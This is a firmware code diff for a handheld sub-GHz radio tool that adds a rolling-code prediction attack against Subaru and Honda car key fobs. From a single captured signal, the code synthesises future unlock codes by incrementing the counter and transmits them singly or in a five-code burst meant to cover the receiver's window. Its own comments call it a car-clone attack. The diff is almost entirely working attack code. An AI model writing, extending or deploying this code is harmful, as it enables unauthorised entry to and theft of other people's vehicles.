@@ -6,8 +6,17 @@
 #include <lib/subghz/blocks/generic.h>
 #include <lib/subghz/protocols/keeloq.h>
 #include <lib/subghz/protocols/vag.h>
+#include <lib/subghz/protocols/subaru.h>
+#include <lib/subghz/protocols/honda_v2_v3.h>
+#include <lib/subghz/protocols/protocols_common.h> // FF_CNT field name
 #include <lib/flipper_format/flipper_format.h>
 #include <string.h>
+
+// One-action next-code burst: how many consecutive codes to fire, and how long
+// to hold each on-air before advancing. Covers a receiver's forward window in
+// one press (Subaru single-capture; Honda Rolling-PWN consecutive sequence).
+#define SUBGHZ_PREDICT_BURST_N        5U
+#define SUBGHZ_PREDICT_BURST_DWELL_MS 260U
 
 // Rolling-Code Analyzer = the car-clone attack surface (clone/save/emulate a
 // CAPTURED rolling fob). PRIVATE builds only — reached from the analyze scene's
@@ -100,6 +109,19 @@ static bool subghz_scene_rolling_analyzer_can_save_generic(
     if(strcmp(protocol_name, VAG_PROTOCOL_NAME) == 0) return false;
     return (decoder->protocol->flag & SubGhzProtocolFlag_Save) == SubGhzProtocolFlag_Save;
 }
+
+// Next-code prediction gate (PRIVATE-only): keyless-PREDICTABLE dynamic fobs whose
+// codec rebuilds a valid frame from (serial, cnt) with NO manufacturer secret, so
+// we can synthesize the next rolling code(s) from a single capture. Confirmed
+// keyless: Subaru (Wimmenhove predictable counter) and Honda V2/V3 (Rolling-PWN
+// family — honda_v2/v3_pack_generic re-derive the frame from serial+counter).
+// Crypto rolling fobs (KeeLoq/VAG/etc.) are excluded — they need the real key, so
+// they fall through to their own clone/emulate or single-replay paths.
+static bool subghz_scene_rolling_analyzer_can_predict(const char* protocol_name) {
+    if(!protocol_name) return false;
+    return strcmp(protocol_name, SUBARU_PROTOCOL_NAME) == 0 ||
+           strcmp(protocol_name, SUBGHZ_PROTOCOL_HONDA_V2_V3_NAME) == 0;
+}
 #endif
 
 static void subghz_scene_rolling_analyzer_button_callback(
@@ -114,6 +136,24 @@ static void subghz_scene_rolling_analyzer_button_callback(
     } else if((result == GuiButtonTypeRight) && (type == InputTypeShort)) {
         view_dispatcher_send_custom_event(
             subghz->view_dispatcher, SubGhzCustomEventSceneRollingAnalyzerSave);
+    }
+}
+
+// Predict-fob buttons: Center = single next code (advances one per press),
+// Left = one-action burst of the next N codes. Kept separate from the KeeLoq
+// clone callback so the Center slot means "Next" (not "Clone") for these fobs.
+static void subghz_scene_rolling_analyzer_predict_button_callback(
+    GuiButtonType result,
+    InputType type,
+    void* context) {
+    furi_assert(context);
+    SubGhz* subghz = context;
+    if((result == GuiButtonTypeCenter) && (type == InputTypeShort)) {
+        view_dispatcher_send_custom_event(
+            subghz->view_dispatcher, SubGhzCustomEventSceneRollingAnalyzerNext);
+    } else if((result == GuiButtonTypeLeft) && (type == InputTypeShort)) {
+        view_dispatcher_send_custom_event(
+            subghz->view_dispatcher, SubGhzCustomEventSceneRollingAnalyzerBurst);
     }
 }
 
@@ -198,10 +238,14 @@ void subghz_scene_rolling_analyzer_on_enter(void* context) {
     widget_add_string_multiline_element(
         subghz->widget, 0, 13, AlignLeft, AlignTop, FontSecondary, furi_string_get_cstr(body));
 
-    const char* verdict =
-        decoded ?
-            "Rolling: raw replay rejected; TX re-advances counter." :
-            "Rolling: mfr key unknown - counter not decodable. Add key to keeloq_mfcodes_user.";
+    const char* verdict;
+    if(subghz_scene_rolling_analyzer_can_predict(protocol_name)) {
+        verdict = "Predictable: Next=+1 code, Burst=next N (single capture).";
+    } else if(decoded) {
+        verdict = "Rolling: raw replay rejected; TX re-advances counter.";
+    } else {
+        verdict = "Rolling: mfr key unknown - counter not decodable. Add key to keeloq_mfcodes_user.";
+    }
     widget_add_string_multiline_element(
         subghz->widget, 0, 51, AlignLeft, AlignTop, FontSecondary, verdict);
 
@@ -231,7 +275,29 @@ void subghz_scene_rolling_analyzer_on_enter(void* context) {
             subghz);
     }
 #ifndef PUBLIC_BUILD
-    else if(subghz_scene_rolling_analyzer_can_save_generic(protocol_name, decoder)) {
+    else if(subghz_scene_rolling_analyzer_can_predict(protocol_name)) {
+        // Keyless-predictable fob: synthesize the next rolling code(s) from this
+        // single capture. Center "Next" = +1 code per press; Left "Burst" = the
+        // next N consecutive codes in one action; Right "Save" = plain capture.
+        widget_add_button_element(
+            subghz->widget,
+            GuiButtonTypeLeft,
+            "Burst",
+            subghz_scene_rolling_analyzer_predict_button_callback,
+            subghz);
+        widget_add_button_element(
+            subghz->widget,
+            GuiButtonTypeCenter,
+            "Next",
+            subghz_scene_rolling_analyzer_predict_button_callback,
+            subghz);
+        widget_add_button_element(
+            subghz->widget,
+            GuiButtonTypeRight,
+            "Save",
+            subghz_scene_rolling_analyzer_button_callback,
+            subghz);
+    } else if(subghz_scene_rolling_analyzer_can_save_generic(protocol_name, decoder)) {
         // Any other serializable fob: Save to Garage as a plain replay (single-use
         // for rolling codes — no future-code generation for these protocols).
         widget_add_button_element(
@@ -251,6 +317,99 @@ void subghz_scene_rolling_analyzer_on_enter(void* context) {
 
 bool subghz_scene_rolling_analyzer_on_event(void* context, SceneManagerEvent event) {
     SubGhz* subghz = context;
+
+    // Next-code prediction (keyless-predictable dynamic fobs): synthesize + TX the
+    // next rolling code(s). Center "Next" = one code, advancing +1 per press; Left
+    // "Burst" = the next N codes fired back-to-back in one action. The keyless codec
+    // rebuilds a valid frame from (serial, cnt), so overriding just the Cnt field in
+    // the serialized capture yields a valid future code the receiver will accept.
+    if(event.type == SceneManagerEventTypeCustom &&
+       (event.event == SubGhzCustomEventSceneRollingAnalyzerNext ||
+        event.event == SubGhzCustomEventSceneRollingAnalyzerBurst)) {
+        const bool burst = (event.event == SubGhzCustomEventSceneRollingAnalyzerBurst);
+
+        subghz->state_notifications = SubGhzNotificationStateIDLE;
+        subghz_txrx_hopper_set_state(subghz->txrx, SubGhzHopperStateOFF);
+        subghz_txrx_stop(subghz->txrx);
+
+        bool loaded = subghz_txrx_load_decoder_by_name_protocol(
+            subghz->txrx,
+            subghz_history_get_protocol_name(subghz->history, subghz->idx_menu_chosen));
+        FlipperFormat* fff =
+            subghz_history_get_raw_data(subghz->history, subghz->idx_menu_chosen);
+        SubGhzProtocolDecoderBase* decoder = subghz_txrx_get_decoder(subghz->txrx);
+        if(loaded && fff && decoder) {
+            subghz_protocol_decoder_base_deserialize(decoder, fff);
+        }
+        if(!loaded || !fff || !decoder || !decoder->protocol ||
+           !subghz_scene_rolling_analyzer_can_predict(decoder->protocol->name)) {
+            return false;
+        }
+
+        SubGhzRadioPreset* hp =
+            subghz_history_get_radio_preset(subghz->history, subghz->idx_menu_chosen);
+        SubGhzRadioPreset preset = hp ? *hp : subghz_txrx_get_preset(subghz->txrx);
+
+        // Serialize the capture (Protocol/Serial/Btn/Cnt/Key/Preset), then override
+        // only Cnt — the encoder re-derives the whole frame from (serial, cnt).
+        FlipperFormat* ff = flipper_format_string_alloc();
+        bool ok =
+            (subghz_protocol_decoder_base_serialize(decoder, ff, &preset) ==
+             SubGhzProtocolStatusOk);
+        uint32_t base_cnt = 0;
+        if(ok) {
+            flipper_format_rewind(ff);
+            if(!flipper_format_read_uint32(ff, FF_CNT, &base_cnt, 1)) base_cnt = 0;
+        }
+
+        FuriString* path = furi_string_alloc();
+        furi_string_printf(
+            path, "%s/garage/predict_%s.sub", SUBGHZ_APP_FOLDER, decoder->protocol->name);
+
+        if(ok && !burst) {
+            // NEXT: one code. Offset advances +1 per press; scene state persists across
+            // Transmitter round-trips and auto-resets to 0 on a fresh scene entry.
+            uint32_t off = scene_manager_get_scene_state(
+                subghz->scene_manager, SubGhzSceneRollingAnalyzer);
+            off++;
+            scene_manager_set_scene_state(
+                subghz->scene_manager, SubGhzSceneRollingAnalyzer, off);
+            uint32_t next_cnt = base_cnt + off;
+            flipper_format_insert_or_update_uint32(ff, FF_CNT, &next_cnt, 1);
+            ok = subghz_save_protocol_to_file(subghz, ff, furi_string_get_cstr(path)) &&
+                 subghz_key_load(subghz, furi_string_get_cstr(path), false);
+            furi_string_free(path);
+            flipper_format_free(ff);
+            if(ok) {
+                scene_manager_next_scene(subghz->scene_manager, SubGhzSceneTransmitter);
+                return true;
+            }
+            return false;
+        }
+
+        if(ok && burst) {
+            // BURST: fire cnt+1 .. cnt+N back-to-back, each held on-air DWELL ms.
+            // Blocks briefly (~N*DWELL) — a deliberate single-shot attack action.
+            for(uint32_t i = 1; i <= SUBGHZ_PREDICT_BURST_N; i++) {
+                uint32_t c = base_cnt + i;
+                flipper_format_insert_or_update_uint32(ff, FF_CNT, &c, 1);
+                if(!subghz_save_protocol_to_file(subghz, ff, furi_string_get_cstr(path))) break;
+                if(!subghz_key_load(subghz, furi_string_get_cstr(path), false)) break;
+                if(subghz_tx_start(subghz, subghz_txrx_get_fff_data(subghz->txrx))) {
+                    furi_delay_ms(SUBGHZ_PREDICT_BURST_DWELL_MS);
+                    subghz_txrx_stop(subghz->txrx);
+                }
+            }
+            furi_string_free(path);
+            flipper_format_free(ff);
+            return true;
+        }
+
+        furi_string_free(path);
+        flipper_format_free(ff);
+        return false;
+    }
+
     if(event.type == SceneManagerEventTypeCustom &&
        (event.event == SubGhzCustomEventSceneRollingAnalyzerClone ||
         event.event == SubGhzCustomEventSceneRollingAnalyzerSave)) {
